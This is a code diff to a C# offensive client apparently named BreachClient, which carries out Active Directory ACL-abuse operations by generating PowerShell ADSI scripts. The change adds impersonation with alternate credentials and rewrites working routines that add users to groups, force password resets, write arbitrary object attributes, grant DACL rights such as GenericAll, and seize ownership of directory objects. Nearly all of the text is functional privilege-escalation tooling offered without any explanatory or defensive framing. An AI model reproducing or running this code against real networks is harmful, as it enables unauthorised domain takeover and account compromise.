@@ -419,12 +419,13 @@ namespace BreachClient
 
         /// <summary>
         /// Execute an Active Directory ACL abuse operation via PowerShell ADSI.
-        /// Instruction wire format: "op|arg1|arg2[|arg3]"
+        /// Wire format: "op|arg1|arg2[|arg3][|altuser|altpass]"
         ///   addmember           group|user
         ///   forcechangepassword user|newpassword
         ///   genericwrite        target_sam|attribute|value
         ///   writedacl           target_sam|principal_sam|right
         ///   writeowner          target_sam|new_owner_sam
+        /// Append |altuser|altpass to impersonate a different account for the ADSI call.
         /// </summary>
         static string RunAclAbuse(string instruction)
         {
@@ -442,6 +443,20 @@ namespace BreachClient
                 _                     => $"[error] Unknown ACL abuse operation: {parts[0]}"
             };
         }
+
+        // Returns (altUser, altPass) from the tail of parts if present, otherwise (null, null).
+        static (string? user, string? pass) ExtractCreds(string[] parts, int fixedCount)
+        {
+            if (parts.Length >= fixedCount + 2)
+                return (parts[fixedCount], parts[fixedCount + 1]);
+            return (null, null);
+        }
+
+        // Builds the PowerShell $root DirectoryEntry line, with or without credentials.
+        static string AdsiRoot(string? altUser, string? altPass) =>
+            altUser != null
+                ? $"$root = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$env:USERDNSDOMAIN\", '{altUser}', '{altPass}')"
+                : "$root = New-Object System.DirectoryServices.DirectoryEntry(\"LDAP://$env:USERDNSDOMAIN\")";
 
         /// <summary>
         /// Run a PowerShell script via -EncodedCommand (UTF-16 LE base64) to avoid
@@ -466,73 +481,125 @@ namespace BreachClient
             return string.IsNullOrWhiteSpace(stderr) ? stdout : stdout + "\n[stderr] " + stderr;
         }
 
-        // addmember|<group>|<user>
+        // addmember|<group>|<user>[|altuser|altpass]
         static string AclAddMember(string[] p)
         {
             if (p.Length < 3) return "[error] addmember: requires group|user";
-            return ExecuteCommand($"net group \"{p[1]}\" \"{p[2]}\" /add /domain");
+            var (altUser, altPass) = ExtractCreds(p, 3);
+            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string script = $@"
+{AdsiRoot(altUser, altPass)}
+$gs = New-Object System.DirectoryServices.DirectorySearcher($root)
+$gs.Filter = '(sAMAccountName={p[1]})'
+$gr = $gs.FindOne()
+if (-not $gr) {{ throw 'Group {p[1]} not found' }}
+$groupDN = $gr.Properties['distinguishedName'][0]
+$ms = New-Object System.DirectoryServices.DirectorySearcher($root)
+$ms.Filter = '(sAMAccountName={p[2]})'
+$mr = $ms.FindOne()
+if (-not $mr) {{ throw 'User {p[2]} not found' }}
+$memberDN = $mr.Properties['distinguishedName'][0]
+$groupEntry = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$groupDN""{credArgs})
+$groupEntry.Add(""LDAP://$memberDN"")
+$groupEntry.CommitChanges()
+'[+] Added {p[2]} to {p[1]}'
+";
+            return RunPowerShell(script);
         }
 
-        // forcechangepassword|<user>|<newpassword>
+        // forcechangepassword|<user>|<newpassword>[|altuser|altpass]
         static string AclForceChangePassword(string[] p)
         {
             if (p.Length < 3) return "[error] forcechangepassword: requires user|newpassword";
-            string script = string.Format(
-                @"$u = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
-$u.Invoke('SetPassword', '{1}')
+            var (altUser, altPass) = ExtractCreds(p, 3);
+            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string script = $@"
+{AdsiRoot(altUser, altPass)}
+$s = New-Object System.DirectoryServices.DirectorySearcher($root)
+$s.Filter = '(sAMAccountName={p[1]})'
+$r = $s.FindOne()
+if (-not $r) {{ throw 'User {p[1]} not found' }}
+$dn = $r.Properties['distinguishedName'][0]
+$u = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$dn""{credArgs})
+$u.Invoke('SetPassword', '{p[2]}')
 $u.CommitChanges()
-'[+] Password changed for {0}'",
-                p[1], p[2]);
+'[+] Password changed for {p[1]}'
+";
             return RunPowerShell(script);
         }
 
-        // genericwrite|<target_sam>|<attribute>|<value>
-        // Writes a string attribute on any AD object (user, group, computer).
-        // Common targets: scriptPath, servicePrincipalName, msDS-KeyCredentialLink
+        // genericwrite|<target_sam>|<attribute>|<value>[|altuser|altpass]
         static string AclGenericWrite(string[] p)
         {
             if (p.Length < 4) return "[error] genericwrite: requires target|attribute|value";
-            string script = string.Format(
-                @"$obj = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
-$obj.Put('{1}', '{2}')
+            var (altUser, altPass) = ExtractCreds(p, 4);
+            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string script = $@"
+{AdsiRoot(altUser, altPass)}
+$s = New-Object System.DirectoryServices.DirectorySearcher($root)
+$s.Filter = '(sAMAccountName={p[1]})'
+$r = $s.FindOne()
+if (-not $r) {{ throw 'Object {p[1]} not found' }}
+$dn = $r.Properties['distinguishedName'][0]
+$obj = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$dn""{credArgs})
+$obj.Put('{p[2]}', '{p[3]}')
 $obj.CommitChanges()
-'[+] Wrote {1}={2} on {0}'",
-                p[1], p[2], p[3]);
+'[+] Wrote {p[2]}={p[3]} on {p[1]}'
+";
             return RunPowerShell(script);
         }
 
-        // writedacl|<target_sam>|<principal_sam>|<right>
-        // Grants an ActiveDirectoryRights right to principal over target.
-        // Common rights: GenericAll, GenericWrite, WriteDacl, WriteOwner, ResetPassword
+        // writedacl|<target_sam>|<principal_sam>|<right>[|altuser|altpass]
         static string AclWriteDacl(string[] p)
         {
             if (p.Length < 4) return "[error] writedacl: requires target|principal|right";
-            string script = string.Format(
-                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
-$prin = ([adsisearcher]'(sAMAccountName={1})').FindOne()
-$sid = New-Object System.Security.Principal.SecurityIdentifier($prin.Properties['objectSid'][0], 0)
-$right = [System.DirectoryServices.ActiveDirectoryRights]::{2}
+            var (altUser, altPass) = ExtractCreds(p, 4);
+            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string script = $@"
+{AdsiRoot(altUser, altPass)}
+$ts = New-Object System.DirectoryServices.DirectorySearcher($root)
+$ts.Filter = '(sAMAccountName={p[1]})'
+$tr = $ts.FindOne()
+if (-not $tr) {{ throw 'Target {p[1]} not found' }}
+$tdn = $tr.Properties['distinguishedName'][0]
+$ps = New-Object System.DirectoryServices.DirectorySearcher($root)
+$ps.Filter = '(sAMAccountName={p[2]})'
+$pr = $ps.FindOne()
+if (-not $pr) {{ throw 'Principal {p[2]} not found' }}
+$sid = New-Object System.Security.Principal.SecurityIdentifier($pr.Properties['objectSid'][0], 0)
+$right = [System.DirectoryServices.ActiveDirectoryRights]::{p[3]}
 $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($sid, $right, [System.Security.AccessControl.AccessControlType]::Allow)
+$tgt = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$tdn""{credArgs})
 $tgt.ObjectSecurity.AddAccessRule($ace)
 $tgt.CommitChanges()
-'[+] Granted {2} to {1} over {0}'",
-                p[1], p[2], p[3]);
+'[+] Granted {p[3]} to {p[2]} over {p[1]}'
+";
             return RunPowerShell(script);
         }
 
-        // writeowner|<target_sam>|<new_owner_sam>
-        // Takes ownership of an AD object — typically followed by writedacl GenericAll.
+        // writeowner|<target_sam>|<new_owner_sam>[|altuser|altpass]
         static string AclWriteOwner(string[] p)
         {
             if (p.Length < 3) return "[error] writeowner: requires target|new_owner";
-            string script = string.Format(
-                @"$tgt = ([adsisearcher]'(sAMAccountName={0})').FindOne().GetDirectoryEntry()
-$own = ([adsisearcher]'(sAMAccountName={1})').FindOne()
-$sid = New-Object System.Security.Principal.SecurityIdentifier($own.Properties['objectSid'][0], 0)
+            var (altUser, altPass) = ExtractCreds(p, 3);
+            string credArgs = altUser != null ? $", '{altUser}', '{altPass}'" : "";
+            string script = $@"
+{AdsiRoot(altUser, altPass)}
+$ts = New-Object System.DirectoryServices.DirectorySearcher($root)
+$ts.Filter = '(sAMAccountName={p[1]})'
+$tr = $ts.FindOne()
+if (-not $tr) {{ throw 'Target {p[1]} not found' }}
+$tdn = $tr.Properties['distinguishedName'][0]
+$os = New-Object System.DirectoryServices.DirectorySearcher($root)
+$os.Filter = '(sAMAccountName={p[2]})'
+$or = $os.FindOne()
+if (-not $or) {{ throw 'New owner {p[2]} not found' }}
+$sid = New-Object System.Security.Principal.SecurityIdentifier($or.Properties['objectSid'][0], 0)
+$tgt = New-Object System.DirectoryServices.DirectoryEntry(""LDAP://$tdn""{credArgs})
 $tgt.ObjectSecurity.SetOwner($sid)
 $tgt.CommitChanges()
-'[+] Ownership of {0} set to {1}'",
-                p[1], p[2]);
+'[+] Ownership of {p[1]} set to {p[2]}'
+";
             return RunPowerShell(script);
         }
 
